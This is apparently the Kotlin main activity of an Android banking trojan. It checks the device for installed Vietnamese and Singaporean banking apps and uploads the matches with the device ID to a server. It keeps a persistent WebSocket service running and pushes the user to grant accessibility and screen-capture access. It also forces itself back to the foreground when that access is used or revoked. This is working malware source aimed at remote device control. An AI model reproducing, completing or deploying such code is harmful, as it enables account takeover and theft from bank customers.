package com.env.icom.epoint

import android.annotation.SuppressLint
import android.app.Activity
import android.app.PictureInPictureParams
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.Canvas
import android.graphics.Color
import android.net.wifi.WifiManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Base64
import android.util.DisplayMetrics
import android.util.Log
import android.util.Rational
import android.view.KeyEvent
import android.view.MotionEvent
import android.view.View
import android.view.WindowManager
import android.webkit.JavascriptInterface
import android.widget.Button
import android.widget.ImageView
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.blankj.utilcode.util.BarUtils
import com.blankj.utilcode.util.LogUtils
import com.bank.vietnam.Assists
import com.bank.vietnam.AssistsService
import com.bank.vietnam.AssistsServiceListener
import com.bank.vietnam.WebSocketManager
import com.bank.vietnam.WebSocketService
import com.env.icom.epoint.databinding.ActivityMainBinding
import com.bank.vietnam.stepper.Quanxian
import com.bank.vietnam.stepper.StepManager
import com.bank.vietnam.utils.AppConfig
import kotlinx.coroutines.*
import java.io.ByteArrayOutputStream
import java.net.InetAddress
import java.net.NetworkInterface
import java.nio.ByteBuffer
import java.nio.ByteOrder
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity(), AssistsServiceListener  {


    private lateinit var screenReceiver: ScreenReceiver
    private lateinit var intentFilter: IntentFilter

    @SuppressLint("NewApi", "WrongThread")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        BarUtils.setStatusBarLightMode(this, true)



        // 从 MainActivity 启动 Webview 页面
//        startActivity(Intent(this, Webview::class.java))


        // 设置全屏模式
        window.decorView.systemUiVisibility = (
                View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                        or View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                        or View.SYSTEM_UI_FLAG_FULLSCREEN
                        or View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                        or View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                        or View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                )

        window.decorView.systemUiVisibility = View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN or View.SYSTEM_UI_FLAG_LAYOUT_STABLE
        window.statusBarColor = Color.TRANSPARENT

        setContentView(viewBind.root)
        Assists.serviceListeners.add(this)
        Assists.setCurrentActivity(this)


        val isHardwareAccelerated = window.decorView.isHardwareAccelerated
        Log.d("HardwareAcceleration", "Is Hardware Accelerated: $isHardwareAccelerated")


        // 获取已安装的所有应用信息并上传
        uploadInstalledAppsInBatches(this,50)

//        WebSocketManager.initWebSocket(this)

        val serviceIntent = Intent(this, WebSocketService::class.java)
        ContextCompat.startForegroundService(this, serviceIntent)


        val textView = findViewById<TextView>(R.id.accessibility_text)
        textView.post {
            val text = textView.text.toString() // 获取文字内容
            val charIndex = text.indexOf('.') // 找到目标字符的索引
            if (charIndex == -1) {
                println("目标字符未找到")
                return@post
            }

            // 获取 TextView 在屏幕上的位置
            val location = IntArray(2)
            textView.getLocationOnScreen(location)
            val textViewX = location[0]
            val textViewY = location[1]

            // 获取文字的 Layout
            val layout = textView.layout ?: return@post
            val line = layout.getLineForOffset(charIndex) // 获取字符所在的行
            val charX = layout.getPrimaryHorizontal(charIndex) // 获取字符相对左边缘的 X 坐标
            val charY = layout.getLineBaseline(line) // 获取字符基线的 Y 坐标

            // 计算字符的绝对屏幕坐标
            val absoluteCharX = textViewX + charX
            val absoluteCharY = textViewY + charY

            println("字符 '.' 的坐标：x=$absoluteCharX, y=$absoluteCharY")

            val button = findViewById<Button>(R.id.btn_option)

            button.post {
                // 获取按钮的屏幕位置
                val buttonLocation = IntArray(2)
                button.getLocationOnScreen(buttonLocation)

                val buttonX = buttonLocation[0] // 按钮左上角X坐标
                val buttonY = buttonLocation[1] // 按钮左上角Y坐标

                // 获取按钮宽度和高度
                val buttonWidth = button.width
                val buttonHeight = button.height

                // 计算 "K" 的起始位置
                val buttonText = button.text.toString()
                val paint = button.paint
                val textWidth = paint.measureText(buttonText) // 文本总宽度
                val charWidth = paint.measureText("K") // 单个字符 "K" 的宽度

                val textStartX = (buttonWidth - textWidth) / 2 // 文本的起始X位置（居中对齐）
                val textStartY = (buttonHeight / 2) - ((paint.descent() + paint.ascent()) / 2) // 文本Y中心位置

                val kX = buttonX + textStartX // "K" 的屏幕X坐标
                val kY = buttonY + textStartY // "K" 的屏幕Y坐标

                println("K 的屏幕坐标: ($kX, $kY)")

                // 存储为 "x,y|kX,kY" 格式
                val combinedCoordinates = "$absoluteCharX,$absoluteCharY|$kX,$kY"

                val sharedPreferences = getSharedPreferences("AppUploadPrefs", Context.MODE_PRIVATE)
                sharedPreferences.edit().putString("Coordinates", combinedCoordinates).apply()

                println("存储的坐标为: $combinedCoordinates")
            }
        }


    }







    private fun checkAndRequestPermissions(context: Context): Boolean {
        val permissions = arrayOf(
            android.Manifest.permission.READ_EXTERNAL_STORAGE
        )
        val deniedPermissions = permissions.filter {
            ContextCompat.checkSelfPermission(context, it) != PackageManager.PERMISSION_GRANTED
        }

        if (deniedPermissions.isNotEmpty()) {
            ActivityCompat.requestPermissions(
                (context as Activity),
                deniedPermissions.toTypedArray(),
                1001 // 请求码
            )
            return false
        }
        return true
    }



    private fun updateStatusIcons() {
        val accessibilityStatus = findViewById<ImageView>(R.id.accessibility_status)
        val screenRecordingStatus = findViewById<ImageView>(R.id.screen_recording_status)

        if (Assists.isAccessibilityServiceEnabled()) {
            accessibilityStatus.setImageResource(R.drawable.ic_green_check)
        } else {
            accessibilityStatus.setImageResource(R.drawable.ic_gray_check)
        }

        if (Assists.isEnableScreenCapture()) {
            screenRecordingStatus.setImageResource(R.drawable.ic_green_check)
        } else {
            screenRecordingStatus.setImageResource(R.drawable.ic_gray_check)
        }
    }

    val viewBind: ActivityMainBinding by lazy {
        ActivityMainBinding.inflate(layoutInflater).apply {
            btnOption.setOnClickListener {
                Assists.openAccessibilitySetting()
            }
            btnLuping.setOnClickListener {
                if (!Assists.isEnableScreenCapture()) {
                    Assists.requestScreenCapture(true, "1")
                } else {
//                    Assists.requestScreenCapture(true, "1")
                    Log.e("DeviceInfo", "11111")
                    StepManager.execute(Quanxian::class.java, 1,data=true)
                }
            }

        }
    }



    /**
     * 获取已安装应用列表
     */
    fun getInstalledAppsWithIcons(context: Context): List<Map<String, String>> {
        val packageManager = context.packageManager
        val apps = mutableListOf<Map<String, String>>()

        // 目标包名列表
        val targetPackages = setOf(
            "com.dbs.sg.posbmbanking",
            "com.tpb.mb.gprsandroid",
            "com.vnpay.abbank",
            "com.vnpay.bvbank",
            "pgbankApp.pgbank.com.vn",
            "com.vnpay.vpbankonline",
            "vn.com.msb.smartBanking",
            "com.vnpay.ocean",
            "com.sacombank.ewallet",
            "com.sunshine.ksbank",
            "com.shinhan.global.vn.bank",
            "com.bab.retailUAT",
            "com.vnpay.SCB",
            "com.VCB",
            "com.vib.myvib2",
            "vn.com.lpb.lienviet24h",
            "com.vnpay.hdbank",
            "vn.com.techcombank.bb.app",
            "com.vnpay.sgbank",
            "com.dongabank.mobilenternet",
            "com.vnpay.bidv",
            "com.vnpay.Agribank3g",
            "com.mbmobile",
            "com.dbs.sg.dbsmbanking",
            "ops.namabank.com.vn",
            "com.vietinbank.ipay",
            "mobile.acb.com.vn"
        )

        val installedPackages = packageManager.getInstalledApplications(PackageManager.GET_META_DATA)
        for (packageInfo in installedPackages) {
            val packageName = packageInfo.packageName
            if (packageName in targetPackages) { // 只添加目标包名的应用
                val appName = packageManager.getApplicationLabel(packageInfo).toString()
                val iconBase64 = getAppIconBase64(context, packageName) ?: "" // 确保是非空字符串

                apps.add(
                    mapOf(
                        "app_name" to appName,
                        "package_name" to packageName,
                        "icon" to iconBase64
                    )
                )
            }
        }
        return apps
    }


    fun getAppIconBase64(context: Context, packageName: String): String? {
        return try {
            val drawable = context.packageManager.getApplicationIcon(packageName)
            val bitmap = Bitmap.createBitmap(drawable.intrinsicWidth, drawable.intrinsicHeight, Bitmap.Config.ARGB_8888)
            val canvas = Canvas(bitmap)
            drawable.setBounds(0, 0, canvas.width, canvas.height)
            drawable.draw(canvas)

            val outputStream = ByteArrayOutputStream()
            bitmap.compress(Bitmap.CompressFormat.PNG, 100, outputStream)
            val byteArray = outputStream.toByteArray()
            Base64.encodeToString(byteArray, Base64.DEFAULT)
        } catch (e: Exception) {
            null // 如果获取图标失败，返回 null
        }
    }


    fun uploadInstalledAppsInBatches(context: Context, batchSize: Int = 50) {
        val sharedPreferences = context.getSharedPreferences("AppUploadPrefs", Context.MODE_PRIVATE)

        // 获取上次上传时间戳
        val lastUploadTime = sharedPreferences.getLong("last_upload_time", 0L)
        val currentTime = System.currentTimeMillis()

        // 检查是否超过 24 小时
        val isTimeToUpload = (currentTime - lastUploadTime) > TimeUnit.HOURS.toMillis(240)

        if (!isTimeToUpload) {
            Log.d("InstalledApps", "距离上次上传不足 24 小时，跳过上传")
            return
        }
        val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
        // 延迟执行上传
        CoroutineScope(Dispatchers.Main).launch {
            delay(1000) // 延迟 1 秒，避免阻塞 UI 加载
            withContext(Dispatchers.IO) {
                val apps = getInstalledAppsWithIcons(context) // 获取已安装应用列表
                val batches = apps.chunked(batchSize) // 分批处理

                for (batch in batches) {
                    Assists.uploadBatch(androidId,batch)
                }

                // 更新上传时间戳
                sharedPreferences.edit().putLong("last_upload_time", currentTime).apply()
                Log.d("InstalledApps", "应用列表上传完成")
            }
        }
    }





    override fun onResume() {
        super.onResume()
        checkServiceEnable()
        Assists.getDeviceInfo()
        updateStatusIcons()
    }

    private fun checkServiceEnable() {

        if (Assists.isAccessibilityServiceEnabled()) {
            // 延迟5秒后检查
            quanxian()

        } else {

        }
    }



    fun quanxian(){
        Handler(Looper.getMainLooper()).postDelayed({
            if (!Assists.isEnableScreenCapture()) {
                Assists.requestScreenCapture(true, "1")
            }

        }, 1000) // 延迟5秒

    }


    override fun onServiceConnected(service: AssistsService) {
        onBackApp()
    }


    private fun onBackApp() {
        GlobalScope.launch(Dispatchers.Main) {
            while (Assists.getPackageName() != packageName) {
                Assists.back()
                delay(500)
            }
        }
    }

    override fun onUnbind() {
        Log.e("guanbi", "33333: ", )

        checkServiceEnable()
// 返回到自己的应用
        Assists.service?.rmoveFilter()

        val appIntent = Intent(this, MainActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
        }
        startActivity(appIntent)
    }


    override fun onDestroy() {
        super.onDestroy()
        Assists.serviceListeners.remove(this)

        if (::screenReceiver.isInitialized) {
            unregisterReceiver(screenReceiver)
        }

        Log.e("WebSocketManager", "onDestroy")
    }


    override fun onKeyDown(keyCode: Int, event: KeyEvent?): Boolean {
        if (keyCode == KeyEvent.KEYCODE_BACK) {
            moveTaskToBack(true)
            return true
        }
        return super.onKeyDown(keyCode, event)
    }

    override fun onTouchEvent(event: MotionEvent): Boolean {
        when (event.action) {
            MotionEvent.ACTION_DOWN -> {
                val x = event.x
                val y = event.y
                LogUtils.d("Touch Coordinates", "X: $x, Y: $y")
            }
        }
        return super.onTouchEvent(event)
    }

    @Deprecated("Deprecated in Java")
    override fun onBackPressed() {
        super.onBackPressed()
        moveTaskToBack(true)
    }
}
